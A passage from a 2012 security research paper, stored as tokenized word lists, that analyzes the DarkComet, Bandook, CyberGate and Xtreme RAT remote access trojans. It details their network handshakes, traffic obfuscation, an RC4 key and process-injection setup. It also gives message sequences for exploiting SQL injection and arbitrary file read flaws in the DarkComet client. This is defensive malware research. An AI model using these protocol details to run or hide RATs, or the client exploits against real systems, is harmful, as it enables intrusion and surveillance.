"keylogging", ",", "screen", "and", "camera"], ["capture", ",", "file", "management", ",", "code", "and", "script", "execution", ",", "power", "control", ",", "registry"], ["management", ",", "and", "password", "sniffing", ".", "Wikipedia", "has", "a", "more", "complete", "list", "of"], ["common", "RAT", "functionality", "[1]", "."], ["Our", "research", "focused", "on", "analyzing", "several", "publicly", "available", "RATs:", "DarkComet", ","], ["Bandook", ",", "CyberGate", "and", "Xtreme", "RAT", ".", "Interestingly", ",", "all", "of", "the", "RATs", "we"], ["analyzed", "were", "coded", "either", "in", "part", "or", "entirely", "in", "Delphi", ".", "They", "all", "featured", "a"], ["reverse", "connecting", "architecture", ",", "as", "well", "as", "some", "form", "of", "cryptography", "or"], ["obfuscation", "of", "their", "communications", ".", "In", "this", "paper", ",", "we", "present", "our", "analysis", "of"], ["their", "protocols", ",", "explain", "how", "to", "decrypt", "their", "traffic", ",", "as", "well", "as", "present"], ["vulnerabilities", "we", "have", "found", ".", "The", "appendices", "to", "this", "paper", "contain", "MITM"], ["tools", "for", "decrypting", "traffic", ",", "as", "well", "as", "proof", "of", "concept", "exploits", "for", "the"], ["vulnerabilities", "we\u2019ve", "found", "."], ["Basic", "RAT", "Architecture"], ["Most", "RATs", "employ", "a", "\u201creverse-connecting\u201d", "architecture", "."], ["The", "\u201cclient\u201d", "program", ",", "resides", "on", "the", "attacker\u2019s", "machine", "and", "is", "used", "to", "control"], ["a", "compromised", "system", ".", "If", "often", "features", "a", "full", "UI", "designed", "for", "ease", "of", "use", "."], ["In", "contrast", ",", "the", "\u201cserver\u201d", "program", "is", "a", "much", "smaller", "stub", "which", "is", "installed", "on"], ["the", "compromised", "computer", ".", "These", "servers", "feature", "no", "UI", ",", "and", "take", "measures"], ["to", "disguise", "their", "presence", "."], ["On", "execution", ",", "the", "sever", "initiates", "a", "connection", "back", "to", "the", "client", "computer", ","], ["and", "remote", "control", "is", "then", "possible", ".", "The", "client", "program", "typically", "has", "the"], ["ability", "to", "generate", "server", "stubs", ",", "which", "have", "the", "IP", "address", "of", "the", "client", "(the"], ["command", "and", "control", "center)", "hard", "coded", "into", "them", "."], ["Some", "free", "versions", "of", "the", "RATs", "we", "investigated", "were", "feature", "limited", "to"], ["producing", "server", "stubs", "that", "were", "not", "stealthy", "or", "could", "only", "connect", "to"], ["localhost", ",", "with", "the", "ability", "to", "generate", "\u201cfull\u201d", "stubs", "only", "available", "on", "purchasing"], ["the", "paid", "version", ".", "Some", "servers", "had", "measures", "to", "defeat", "or", "disable", "antivirus"], ["and", "firewall", "software", "on", "the", "compromised", "machine", "."], ["The", "DarkComet", "RAT"], ["DarkComet", "is", "one", "of", "the", "most", "popular", "RATs", "in", "use", "today", ",", "gaining", "recent"], ["notoriety", "after", "its", "use", "by", "the", "Syrian", "government", "[13]", ".", "The", "encryption", "method"], ["used", "in", "DarkComet", "has", "already", "been", "extensively", "analyzed", "by", "various"], ["researchers", "[2]", "[3]", ",", "so", "we", "will", "not", "reiterate", "here", "."], ["We", "reverse", "engineered", "the", "DarkComet", "protocol", "and", "analyzed", "it", "for"], ["vulnerabilities", "."], ["After", "a", "quick", "look", "at", "its", "protocol", ",", "it", "is", "easy", "to", "see", "that", "it", "uses", "a", "\u201c|\u201d", "as", "it\u2019s"], ["delimiter", "between", "string", "parameters", ".", "Although", ",", "there", "is", "no", "delimiter", "between"], ["the", "command", "and", "the", "first", "parameter", "."], ["The", "DarkComet", "client", "stores", "information", "about", "servers", "in", "a", "SQLite", "database", ","], ["which", "is", "kept", "in", "the", "directory", "from", "which", "the", "client", "runs", ".", "This", "database", "also"], ["holds", "usernames", "and", "passwords", "for", "FTP", "servers", "to", "which", "the", "client", "has", "been"], ["configured", "to", "connect", ".", "When", "a", "new", "connection", "is", "established", ",", "a", "handshake"], ["occurs", "which", "looks", "like", "this:"], ["Notation"], ["C->S", "indicates", "a", "message", "from", "the", "Client", "to", "the", "Server"], ["S->C", "indicates", "a", "message", "from", "the", "Server", "to", "the", "Client"], ["(U)"], ["indicates", "the", "message", "is", "unencrypted"], ["DarkComet", "Handshake"], ["C->S:"], ["IDTYPE"], ["S->C:"], ["SERVER"], ["C->S:"], ["GetSIN172", ".", "16.1.1|769734"], ["S->C:"], ["infoesGuest16|172", ".", "16.1.1", "/", "[172", ".", "16.1.128]", ":", "1604|USER-3AA4AD4D2", "/"], ["Administrator|769734|0s|Windows", "XP", "Service", "Pack", "3", "[2600]", "32", "bit", "(", "C:\\", ")|x||"], ["US||{HW-ID}|43%|English", "(United", "States)", "US", "/"], ["5", ".", "3.0"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["--", "|6/13/2012", "at", "2:45:59", "PM|"], ["For", "testing", "purposes", ",", "we", "wrote", "our", "own", "\u201cserver\u201d", "which", "replied", "with", "the"], ["following", "shorter", "SIN", "(Server", "Info)", "string:"], ["infoesX|1|S|5|0s|W", "|x||US|I]|{7}|80%|E|6|5"], ["SQL", "Injection", "in", "DarkComet"], ["By", "attaching", "a", "debugger", "to", "the", "client", ",", "we", "were", "able", "to", "view", "the", "SQL", "strings", "it"], ["generated", "by", "the", "client", "to", "query", "its", "database", ".", "Upon", "connection", "with", "the"], ["above", "SIN", "string", ",", "the", "following", "SQL", "statement", "is", "executed:"], ["\"SELECT", "*", "FROM", "dc_users", "WHERE", "UUID=\"{7}\""], ["If", "that", "UUID", "is", "not", "in", "the", "database", ",", "the", "following", "statement", "is", "executed:"], ["\"INSERT", "INTO", "dc_users", "VALUES(", "\"{7}\"", ",", "\"1\"", ",", "\"S\"", ",", "\"W\"", ",", "\"0\")\""], ["If", "that", "UUID", "already", "exists", ",", "then", "the", "following", "statement", "is", "executed:"], ["\"UPDATE", "dc_users", "SET", "userIP=\"1\"", "WHERE", "UUID=\"{7}\"\""], ["There", "is", "no", "input", "validation", "or", "sanitization", ",", "so", "all", "of", "these", "SQL", "statements", "are"], ["injectable", "with", "the", "following", "caveats:"], ["\u2022", "Executing", "multiple", "commands", "in", "one", "statement", "with", "\u201c;\u201ds", "is", "disabled", ","], ["anything", "after", "a", "\u201c;\u201d", "will", "not", "be", "executed"], ["\u2022", "load_extension()", "is", "disabled"], ["These", "can", "be", "used", "to", "modify", "data", "in", "the", "database", ".", "We", "did", "not", "further"], ["develop", "these", "vulnerabilities", "to", "get", "information", "out", "of", "the", "database", ",", "as", "our"], ["next", "exploit", "made", "doing", "so", "unnecessary", "."], ["Arbitrary", "File", "Read", "from", "the", "Client\u2019s", "File", "System", "in", "DarkComet"], ["DarkComet", "uses", "a", "protocol", "that", "we", "have", "termed", "\u201cQuickUp\u201d", "in", "order", "to", "do"], ["ad-hoc", "uploading", "of", "files", ".", "For", "instance", ",", "the", "client", "has", "a", "feature", "which", "allows"], ["you", "to", "edit", "the", "compromised", "computers", "\u201chosts\u201d", "file", ".", "This", "is", "done", "by"], ["downloading", "the", "hosts", "file", "to", "the", "client", "computer", ",", "editing", "it", ",", "and", "then"], ["uploading", "it", "back", "to", "the", "server", ".", "The", "last", "part", "of", "that", "exchange", "uses", "the"], ["QuickUp", "protocol", ",", "and", "looks", "like", "this:"], ["DarkComet", "QuickUpload"], ["C->S:"], ["QUICKUPC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts", ".", "txt|752|HOSTS"], ["A", "new", "connection", "between", "the", "client", "and", "server", "is", "now", "established", "to"], ["handle", "the", "file", "transfer", ".", "The", "old", "connection", "is", "not", "closed", "first", ",", "the", "existing"], ["socket", "just", "has", "connect()", "called", "on", "it", "again"], ["C->S:"], ["IDTYPE"], ["S->C:"], ["QUICKUP752|C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\SynHosts", ".", "txt|HOSTS"], ["C->S", "(U):"], ["\\x41\\x00\\x43"], ["C->S", "(U):"], ["LENGTH_OF_FILE_IN_BYTES"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["RAW_DATA_OF_SPECIFIED_FILE"], ["S->C", "(U):"], ["A"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Note", "that", "the", "protocol", "consists", "of", "two", "stages", ",", "the", "QUICKUP", "command", "issued"], ["from", "the", "client", ",", "which", "establishes", "a", "\u201cnew\u201d", "connection", ",", "and", "the", "QUICKUP"], ["command", "issued", "from", "the", "server", ",", "which", "begins", "the", "file", "transfer", ".", "Most"], ["importantly", ",", "after", "the", "new", "connection", "has", "been", "opened", ",", "the", "server", "requests"], ["the", "file", "to", "be", "uploaded", ".", "Three", "major", "weaknesses", "are", "present", "in", "this"], ["implementation:"], ["\u2022", "There", "is", "no", "check", "that", "the", "file", "in", "the", "client", "QUICKUP", "is", "the", "same", "as", "the", "file"], ["in", "the", "server", "QUICKUP"], ["\u2022", "The", "client", "responds", "to", "a", "QUICKUP", "commands", ",", "even", "if", "there", "was", "no"], ["corresponding", "QUICKUP", "from", "the", "client"], ["\u2022", "The", "client", "allows", "the", "server", "to", "specify", "the", "absolute", "path"], ["This", "flaw", "allows", "the", "retrieval", "of", "any", "file", "on", "the", "filesystem", "that", "it", "has"], ["permissions", "to", "read", ".", "So", "for", "instance", ",", "to", "get", "a", "dump", "of", "the", "SQLite", "database", ","], ["we", "can", "do", "the", "following:"], ["(1)", "Connect", "to", "the", "server", "and", "successfully", "complete", "the", "handshake"], ["(2)", "Open", "a", "new", "connection", "over", "our", "old", "one", ",", "the", "client", "will", "now", "reply:"], ["DarkComet", "SQLite", "DB", "Dump"], ["C->S:"], ["IDTYPE"], ["We", "now", "send", "a", "QUICKUP", "command", "unprompted"], ["S->C:"], ["QUICKUP111|comet", ".", "db|UPLOADEXEC"], ["C->S", "(U):"], ["\\x41\\x00\\x43"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["LENGTH_OF_FILE"], ["S->C", "(U):"], ["A"], ["C->S", "(U):"], ["RAW_DATA_OF_COMET", ".", "DB"], ["Any", "file", "in", "the", "DarkComet", "directory", "can", "be", "read", "this", "way", ".", "Alternatively", ","], ["absolute", "paths", "can", "be", "specified", ",", "allowing", "read", "access", "to", "any", "file", "on", "the", "client\u2019s"], ["filesystem", "(that", "DarkComet", "has", "permissions", "to", "access)", "."], ["Reading", "\u201cC:\\secret", ".", "txt\u201d", "from", "Client\u2019s", "File", "System"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reading", "\u201cC:\\secret", ".", "txt\u201d", "from", "Client\u2019s", "File", "SystemOverall", ",", "this", "presents", "an", "issue"], ["for", "anyone", "using", "DarkComet", ".", "If", "a", "server", "sample", "is", "discovered", ",", "it", "is", "trivial", "to"], ["retrieve", "the", "key", "from", "the", "binary", "that", "is", "used", "in", "the", "network", "communication", "."], ["The", "key", "retrieval", "process", "can", "even", "be", "automated", "[4]", ".", "Recently", ",", "the", "developer"], ["of", "the", "RAT", "has", "quit", "any", "further", "development", "due", "to", "its", "misuse", ",", "therefore"], ["leaving", "this", "issue", "unpatched", "[12]", "."], ["For", "a", "stub", "server", "(written", "in", "python)", "that", "can", "exploit", "both", "of", "these"], ["vulnerabilities", ",", "see", "Appendix", "A", "."], ["The", "Bandook", "RAT"], ["Bandook", "is", "written", "in", "a", "mix", "of", "C++", "and", "Delphi", "[5]", "[6]", ".", "The", "server", "is", "able", "to", "use"], ["process", "injection", ",", "API", "unhooking", ",", "and", "kernel", "patching", "to", "bypass", "(some"], ["versions)", "of", "the", "Windows", "firewall", ".", "The", "server", "itself", "is", "fairly", "limited", "in"], ["functionality", ",", "but", "has", "the", "ability", "to", "be", "extended", "through", "a", "plugin", "architecture:"], ["the", "client", "can", "upload", "plugin", "code", "to", "the", "server", ".", "The", "client", "comes", "with", "several"], ["plugins", "which", "need", "to", "be", "installed", "on", "the", "server", "to", "enable", "full", "functionality", ".", "By"], ["default", ",", "the", "server", "attempts", "to", "hide", "itself", "by", "creating", "a", "process", "based", "on", "the"], ["default", "browser", "settings", "."], ["It", "lacks", "any", "real", "cryptography", "to", "protect", "its", "traffic", ".", "Instead", ",", "it", "obfuscates", "its"], ["traffic", "by", "XORing", "against", "the", "constant", "0xE9:"], ["XOR", "Loop", "with", "Constant"], ["Almost", "all", "messages", "are", "suffixed", "with", "\u201c&&&\u201d", "in", "cleartext:"], ["Server", "Keepalive", "with", "\u201c&&&\u201d"], ["The", "client", "comes", "bundled", "with", "TightVNC", "1", ".", "2.9.0,", "which", "has", "a", "publicly"], ["known", "security", "vulnerability", ".", "More", "information", "regarding", "the", "vulnerability"], ["and", "proof", "of", "concept", "code", "is", "available", "online", "[7]", "."], ["The", "latest", "public", "release", "of", "Bandook", "is", "v1", ".", "35,", "while", "the", "private", "version", "is"], ["at", "1", ".", "4.", "The", "public", "version", "was", "released", "April", "2007", ",", "which", "makes", "it", "quite"], ["old", "and", "outdated", ".", "It", "only", "supports", "up", "to", "Windows", "Vista", ",", "while", "the", "private"], ["version", "supports", "up", "to", "Win7", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Reverse", "Engineering", "The", "Bandook", "Protocol"], ["We", "will", "leave", "out", "the", "\u201c&&&\u201d", "cleartext", "suffix", "from", "our", "analysis", "."], ["Establishing", "a", "connection", "with", "the", "client", "is", "simple", ".", "The", "server", "will", "start", "by"], ["sending", "one", "command:"], ["Bandook", "Connection", "Initialization"], ["S", "->", "C:"], ["&first&", "#", "0d", "1h", "15m", "#", "Admin", "#"], ["#", "172", ".", "16.250.128"], ["/", "WhiteHouse"], ["#yes#yes#no#no#bndk13me#USA#no#yes#yes#"], ["So", "a", "\u201cfirst\u201d", "command", "is", "used", "to", "establish", "a", "connection", ".", "The", "fields", "separated"], ["by", "\u201c#\u201d", "correspond", "to", "info", "displayed", "in", "the", "client", ",", "such", "as", "IP", ",", "username", ","], ["uptime", ",", "and", "location", ".", "The", "fields", "marked", "yes/no", "correspond", "to", "whether", "the"], ["server", "has", "a", "given", "plugin", "or", "not", "."], ["The", "keepalive", "is", "as", "follows:"], ["Bandook", "Keepalive"], ["C", "->", "S:"], ["&BANG&"], ["S->", "C:"], ["&BAMG&"], ["To", "see", "the", "protocol", "for", "additional", "functionality", ",", "we", "recommend", "using", "the"], ["MITM", "decoder", "in", "Appendix", "B", ".", "To", "any", "researchers", "who", "are", "interested", "in"], ["further", "work", "on", "Bandook", ",", "we", "have", "a", "fairly", "detailed", "set", "of", "notes", "on", "the"], ["additional", "functionality", "protocols", ",", "which", "is", "available", "upon", "request", "."], ["The", "CyberGate", "RAT"], ["CyberGate", "is", "another", "RAT", "written", "in", "Delphi", ".", "It\u2019s", "also", "the", "only", "RAT", "we", "saw", "that"], ["featured", "protection", "against", "reverse", "engineering", ".", "Using", "LordPE", "to", "obtain", "a"], ["dump", ",", "you", "can", "see", "the", "following", "strings:"], ["CyberGate", "Anti-Analysis"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Both", "PEiD", "and", "Detect", "It", "Easy", "could", "not", "identify", "what", "packer", "had", "been", "used", "."], ["We", "worked", "on", "unpacking", "it", ",", "until", "we", "finally", "discovered", "a", "tool", "called"], ["ProtectionID", ".", "This", "was", "able", "to", "identify", "the", "packer", "as", "Safengine", "Licensor", ".", "From"], ["some", "basic", "research", ",", "we", "discovered", "that", "unpacking", "the", "Safengine", "Licensor", "is", "a"], ["project", "in", "itself", ".", "Due", "to", "our", "time", "constraint", ",", "we", "found", "it", "would", "be", "best", "to"], ["continue", "our", "efforts", "analyzing", "another", "RAT", "."], ["Before", "moving", "on", "though", ",", "we", "were", "able", "to", "uncover", "enough", "information", "about"], ["its", "protocol", "from", "the", "server", "stubs", "we", "created", "(which", "aren\u2019t", "packed)", "."], ["Interestingly", ",", "CyberGate", "uses", "two", "different", "schemes", "for", "communication", "."], ["Communication", "from", "the", "client", "to", "the", "server", "is", "done", "using", "a", "variant", "of"], ["base64", ".", "The", "messages", "are", "base64", "encoded", ",", "except", "instead", "of", "the"], ["canonical", "base64", "string:"], ["\u201cABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567"], ["89+/\u201d"], ["the", "string", "used", "is"], ["\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx"], ["yz+/\""], ["This", "is", "an", "obfuscation", "technique", "that", "is", "also", "common", "in", "enterprise"], ["software;", "because", "the", "base64", "dictionary", "has", "been", "scrambled", ",", "a", "standard"], ["base64", "decoder", "produces", "gibberish", "when", "fed", "the", "data", "."], ["The", "base64", "encoded", "messages", "end", "with", "the", "string", "\u201c###@@@\u201d", ",", "which", "when"], ["replaced", "with", "\u201c==\u201d", "and", "then", "fed", "into", "a", "base64", "decoder", "(working", "against", "the"], ["custom", "string)", ",", "produce", "cleartext", "."], ["In", "the", "other", "direction", ",", "messages", "going", "from", "the", "server", "to", "the", "client", "are", "first"], ["compressed", "using", "zlib", "(at", "a", "compression", "level", "of", "1)", ",", "and", "then", "encrypted", "with"], ["RC4", "against", "the", "following", "key:"], ["njgnjvejvorenwtrnionrionvironvrnvcg210public"], ["They", "are", "then", "prefixed", "with", "the", "string", "\u201c@@XXXXXXXXXX@@\u201d"], ["Based", "off", "of", "this", "information", ",", "we", "think", "it\u2019s", "safe", "to", "assume", "the", "private", "version"], ["will", "have", "some", "subtle", "differences", "in", "its", "communication", ".", "Most", "likely", "the", "key", "is"], ["different", ",", "but", "the", "overall", "communication", "architecture", "is", "the", "same", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "RC4", "Swap"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["CyberGate", "Handshake"], ["S->C", "(U):"], ["34|\\n"], ["S->C:"], ["cybergate|Y|"], ["C->S", "(U):"], ["\\x20\\r\\n"], ["S->C", "(U):"], ["\\n"], ["C->S:"], ["maininfo|cybergate|497125y5QX8qVHZ6KNoEzseP1UYFjR|"], ["S->C", "(U):"], ["\\n"], ["S->C:", "(stripping", "out", "a", "lot", "of", "null", "bytes)"], ["maininfo|"], ["CGServer_EC3E266B172", ".", "16.1.128JESSE-3AA4AD4D2/"], ["Administrator-=WindowsXPProfessionalx32(Build:2600ServicePack:"], ["3", ".", "0)*Intel(R)Core(TM)2DuoCPUP8600@2.40GHz511MBConsole"], ["v2", ".", "3.0-Public4000CyberGateServerConsole2301UnitedStates/"], ["English\"English(UnitedStates)\"05/07/2012--15:24172", ".", "16.1.1:4000"], ["|#CGServer|cybergate|console1|Yes|"], ["C->S:"], ["configuracoesdoserver|"], ["S->C", "(U):"], ["\\n"], ["S->C", "(U):"], ["89|\\n"], ["S->C:"], ["configuracoesdoserver|configuracoesdoserver|172", ".", "16.1.1:4000|"], ["#CGServer|cybergate|console1|Yes|"], ["Its", "keepalive", "looks", "like", "this:"], ["CyberGate", "Keepalive"], ["C", "->", "S", "(U):"], ["ping|S->", "C:"], ["S->C", "(U):"], ["pong|CyberGateServerConsole###10157|"], ["A", "MITM", "script", "that", "can", "decrypt", "traffic", "is", "in", "Appendix", "C", "."], ["Xtreme", "RAT"], ["Xtreme", "RAT", "was", "another", "one", "of", "the", "RATs", "used", "by", "the", "Syrian", "government", ".", "We"], ["haven\u2019t", "seen", "much", "public", "analysis", "of", "Xtreme", "RAT", ".", "The", "guys", "over", "at", "malware", ".", "lu"], ["published", "a", "simple", "article", "covering", "a", "sample", "they", "received", "in", "an", "email", ".", "Their"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["analysis", "covered", "identifying", "and", "decrypting", "config", "information", "from", "the", "stub"], ["[10]", ".", "Our", "analysis", "will", "look", "into", "the", "communication", "protocol", "of", "the", "RAT", "."], ["Before", "looking", "at", "any", "internals", ",", "we", "opted", "to", "get", "a", "feel", "for", "the", "UI", ".", "On", "the", "first"], ["run", ",", "users", "are", "prompted", "to", "enter", "a", "password", ".", "Once", "entered", ",", "the", "program", "asks"], ["users", "to", "retype", "the", "password", "to", "confirm", "it", ".", "After", "doing", "so", ",", "a", "file", "named"], ["\u201cuser", ".", "info\u201d", "is", "created", "in", "the", "same", "directory", ".", "This", "file", "is", "simply", "a", "unicode", "string"], ["of", "the", "MD5", "hash", "of", "your", "password", "."], ["Unicode", "MD5", "Hash", "of", "Password", "in"], ["So", "if", "your", "password", "is", "\u201c123\u201d", ",", "your", "user", ".", "info", "will", "contain", "the", "hash"], ["\u2018a933d13f81649bebe035dc21f4002ff1\u2019", ".", "However", ",", "when", "we", "tried", "hashing"], ["\u201c123\u201d", "we", "found", "a", "different", "result", "(the", "correct", "hash", "is"], ["\u2018202cb962ac59075b964b07152d234b70\u2019", ".", ")", "It", "turns", "out", "this", "is", "an", "issue", "that", "was"], ["introduced", "in", "Delphi", "2009", ",", "when", "the", "default", "string", "type", "switched", "from", "ANSI"], ["strings", "to", "unicode", "strings", ".", "The", "MD5", "implementation", "is", "not", "unicode", "aware", "[11]", ","], ["leading", "to", "incorrect", "hashes", "."], ["When", "creating", "a", "server", ",", "we", "tried", "to", "change", "the", "password", "from", "its", "default"], ["\u20180123456789\u2019", ".", "It", "turns", "out", "Xtreme", "RAT", "limits", "your", "password", "to", "being", "only"], ["digits", ".", "It", "also", "rejects", "any", "password", "that", "cannot", "fit", "in", "a", "32-bit", "signed", "integer", "."], ["Well", ",", "that\u2019s", "not", "making", "us", "feel", "very", "secure", "."], ["The", "public", "version", "also", "limits", "the", "user", "to", "creating", "a", "stub", "which", "can", "only"], ["connect", "to", "localhost", "on", "port", "81", ".", "It", "also", "includes", "an", "annoying", "nag", "screen"], ["notifying", "the", "user", "that", "it", "is", "the", "public", "version", ".", "However", ",", "all", "the", "functionality", "of"], ["the", "private", "version", "is", "present", ".", "In", "order", "to", "begin", "analyzing", "its", "communication", ","], ["we", "had", "to", "change", "the", "communication", "IP", ".", "First", ",", "a", "quick", "analysis", "of", "the", "server"], ["stub", "."], ["The", "Xtreme", "RAT", "Server"], ["The", "stub", "sets", "itself", "up", "using", "a", "classic", "technique", "found", "in", "basic", "malware", ".", "It", "first"], ["uses", "CreateProcess()", "to", "create", "a", "new", "process", "(named", "based", "on", "the", "default"], ["browser", ".", ")"], ["CreateProcess()", "Based", "on", "Default"], ["Next", ",", "it", "uses", "WriteProcessMemory()", "to", "copy", "code", "to", "the", "newly", "created", "process"], ["(PE", "header", "starts", "at", "0x1610000)", "."], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Copying", "Code", "to", "the", "Newly", "Created"], ["It", "finishes", "the", "setup", "by", "simply", "resuming", "the", "thread", "using", "ResumeThread()", "."], ["After", "patching", "the", "process", "to", "have", "an", "opcode", "of", "0xEBFE", ",", "which", "is", "an", "infinite"], ["loop", ",", "at", "the", "point", "where", "the", "thread", "resumes", ",", "we", "attached", "a", "debugger", "and"], ["noticed", "that", "the", "process", "begins", "packed", "with", "UPX", "."], ["Standard", "Entry", "Point"], ["Unpacking", "is", "trivial", "from", "this", "point", ".", "Locate", "the", "JMP", "following", "the", "POPAD"], ["instruction", "."], ["Standard", "JMP", "to", "OEP"], ["This", "brings", "us", "to", "our", "OEP:"], ["Original", "Entry", "Point", "for"], ["After", "patching", "the", "dump", "to", "connect", "to", "a", "different", "address", ",", "and", "removing", "the"], ["nag", "screen", ",", "we", "were", "able", "to", "start", "our", "analysis", "of", "the", "communication", "."], ["Xtreme", "RAT", "Communication"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Handshake", "Overview"], ["S->C", "(U):"], ["myversion|3", ".", "6", "Public\\r\\n"], ["C->S", "(U):"], ["\\x58\\x0d\\x0a"], ["C->S", "(U):"], ["\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00"], ["C->S:"], ["maininfo", "?", "?????###?\"", "a", "?", "\"", "a", "?", "\""], ["apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa"], ["54015d0b4a08f2d0"], ["The", "communication", "of", "Xtreme", "RAT", "begins", "with", "the", "server", "making", "a"], ["connection", "to", "the", "client", ".", "We", "then", "have", "the", "following:"], ["Xtreme", "RAT", "Identify", "Message"], ["S", "->C", "(U):"], ["myversion|3", ".", "6", "Public\\r\\n"], ["The", "client", "acknowledges", "by", "sending:"], ["Xtreme", "RAT", "ACK"], ["C", "->S", "(U):"], ["\\x58\\x0d\\x0a"], ["Communication", "continues", "with", "the", "client", "asking", "for", "info", "about", "the", "server", "."], ["Notice", "that", "before", "any", "message", "sent", ",", "the", "stub", "or", "client", "will", "first", "send", "the"], ["password", "and", "length", "of", "the", "message", "to", "come", ",", "in", "little", "endian", "format", "."], ["Annoyingly", ",", "sometimes", "it", "sends", "this", "header", "as", "its", "own", "packet", ",", "sometimes", "it"], ["comes", "prefixed", "to", "the", "actual", "content", ".", "And", "sometimes", "it", "prefixes", "the", "header"], ["with", "an", "ACK", "of", "\u201c\\x58\\x0d\\x0a\u201d", ".", "In", "this", "example", ",", "the", "password", "is", "1234", "and", "the"], ["length", "of", "the", "message", "to", "follow", "is", "166", "bytes", "."], ["Xtreme", "RAT", "Password/Length", "Message"], ["C", "->", "S:"], ["\\xd2\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00"], ["|->", "Password", "=", "0x4d2", "=", "1234"], ["|->Four", "bytes", "padding"], ["|->", "Length", "=", "0xa6", "=", "166"], ["|->Four", "bytes", "padding"], ["Now", "what", "follows", "is", "some", "zlib", "compressed", "data", "with", "size", "166", "bytes", ".", "Note", "that"], ["sometimes", "our", "MITM", "script", "fails", "to", "decode", "the", "zlib", "compressed", "data", ",", "for"], ["reasons", "unknown", "to", "us", ".", "After", "decompression", "we", "have", "the", "following:"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Xtreme", "RAT", "Maininfo"], ["maininfo", "?", "?????###?\"", "a", "?", "\"", "a", "?", "\""], ["apK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk90dd3e7e19b35baa"], ["54015d0b4a08f2d0"], ["Breaking", "it", "into", "its", "parts", "we", "have:"], ["Xtreme", "RAT", "Maininfo", "Dissected"], ["CMD:"], ["maininfo"], ["SEPARATOR:"], ["\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa\\x00\\xc2\\x00\\xaa"], ["\\x00\\x23\\x00\\x23\\x00\\x23\\x00\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20\\x61\\x01\\xe2\\x00\\x22\\x20"], ["\\x61\\x01"], ["RANDOM", "STRING:"], ["pK8qxVwtQ7XBgCuT0bFldfRjaSLmhHPGJyirE5z2A431ZMYUe69WnDcsoNk"], ["MD5:"], ["90dd3e7e19b35baa54015d0b4a08f2d0"], ["The", "random", "string", "is", "just", "that", ",", "a", "random", "string", "of", "length", "0x3B", "or", "59", ".", "It\u2019s"], ["generated", "using", "the", "character", "set:", "[0-9],[A-Z],[a-z]", ".", "The", "hash", "is", "the", "incorrect"], ["MD5sum", "of", "\u201cXtremeRAT\u201d", ".", "This", "will", "always", "remain", "the", "same", "(at", "least", "for", "the"], ["public", "version", "3", ".", "6)."], ["What", "follows", "is", "a", "response", "which", "contains", "some", "information", "about", "the", "system", "."], ["It", "follows", "the", "same", "protocol", "as", "before", ",", "with", "the", "password", "and", "length", "header", ","], ["and", "the", "remaining", "message", "being", "compressed", "with", "zlib", ".", "After", "this", "response", ","], ["the", "stub", "is", "now", "connected", "to", "the", "client", ",", "but", "will", "continue", "to", "send", "more", "info", ","], ["such", "as", "a", "screenshot", "of", "the", "desktop", "and", "a", "list", "of", "any", "webcams", "installed", "."], ["At", "this", "point", ",", "a", "full", "connection", "is", "established", ".", "The", "client", "will", "send", "a", "keep", "alive"], ["while", "idle", ",", "which", "looks", "like", "the", "following:"], ["Xtreme", "RAT", "Keepalive"], ["C", "->", "S:"], ["ping"], ["S", "->", "C:"], ["pong|937|Current_Window", "(Server_Name)"], ["Also", "worth", "noting", ",", "Xtreme", "has", "the", "ability", "to", "try", "to", "disguise", "its", "handshake", "as"], ["HTTP", ".", "In", "which", "case", ",", "its", "opening", "request", "will", "look", "like", "(with", "the", "default"], ["password):"], ["Xtreme", "RAT", "GET", "Request"], ["S->C", "(U):"], ["GET/1234567890", ".", "functions", "HTTP/1", ".", "1"], ["Accept:*/*Accept-Encoding:gzip", ",", "deflate"], ["User-Agent:Mozilla/4", ".", "0(compatible;MSIE7.0;WindowsNT5.1;Trident/"], ["4", ".", "0;.NETCLR1.1.4322;.NETCLR2.0.50727;.NETCLR3.0.4506.2152;.NETCLR3.5.30729;."], ["NET4", ".", "0C)"], ["Host:172", ".", "16.1.1:4000"], ["Connection:Keep-Alive"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["Conclusion"], ["RATs", "represent", "an", "under-researched", "but", "highly", "active", "area", "of", "malware", "\u201cin", "the"], ["wild\u201d", ".", "With", "both", "governments", "and", "non-state", "actors", "using", "RATs", "for"], ["surveillance", ",", "knowledge", "about", "them", "carries", "increasing", "significance", ".", "A", "good"], ["understanding", "of", "their", "protocols", "is", "critical", "to", "network", "and", "system"], ["administrators", "deploying", "tools", "that", "can", "notice", "the", "presence", "of", "a", "RAT", "."], ["All", "of", "the", "RATs", "we", "analyzed", 